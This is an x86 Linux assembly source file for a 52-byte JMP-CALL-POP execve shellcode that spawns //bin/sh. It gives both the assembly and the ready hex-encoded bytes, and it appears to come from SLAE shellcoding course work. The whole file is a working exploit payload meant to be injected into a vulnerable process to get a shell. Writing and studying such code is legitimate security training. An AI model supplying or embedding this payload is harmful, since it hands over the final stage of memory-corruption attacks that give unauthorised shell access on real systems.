;Description:  JMP-CALL-POP execve shell (52 bytes)
;Shellcode:    \xeb\x25\x5e\x89\xf7\x31\xc0\x50\x89\xe2\x50\x83\xc4\x03\x8d\x76\x04\x33\x06\x50\x31\xc0\x33\x07\x50\x89\xe3\x31\xc0\x50\x8d\x3b\x57\x89\xe1\xb0\x0b\xcd\x80\xe8\xd6\xff\xff\xff\x2f\x2f\x62\x69\x6e\x2f\x73\x68
;Author:       Paolo Stivanin <https://github.com/polslinux>
;SLAE ID:      526

global _start

section .text
_start:
    jmp short here

me:
    pop esi
    mov edi,esi

    xor eax,eax
    push eax
    mov edx,esp

    push eax
    add esp,3
    lea esi,[esi +4]
    xor eax,[esi]
    push eax
    xor eax,eax
    xor eax,[edi]
    push eax
    mov ebx,esp

    xor eax,eax
    push eax
    lea edi,[ebx]
    push edi
    mov ecx,esp

    mov al,0xb
    int 0x80

here:
    call me
    path db "//bin/sh"